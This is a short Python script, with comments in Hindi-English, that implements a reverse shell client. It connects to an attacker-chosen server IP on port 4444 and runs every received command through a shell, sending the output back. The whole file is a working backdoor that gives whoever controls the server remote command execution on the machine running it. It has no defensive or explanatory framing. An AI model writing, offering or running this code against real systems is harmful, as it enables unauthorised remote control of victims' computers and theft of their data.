import socket
import subprocess

def run_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Yahan apne server ka IP daalna. Testing ke liye '127.0.0.1' rakh sakte ho.
    server_ip = '127.0.0.1'
    port = 4444
    
    try:
        client.connect((server_ip, port))
    except Exception as e:
        return

    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            output = str(e).encode('utf-8')
            
        try:
            client.send(output)
        except:
            break
        
    client.close()

if __name__ == "__main__":
    run_client()
  
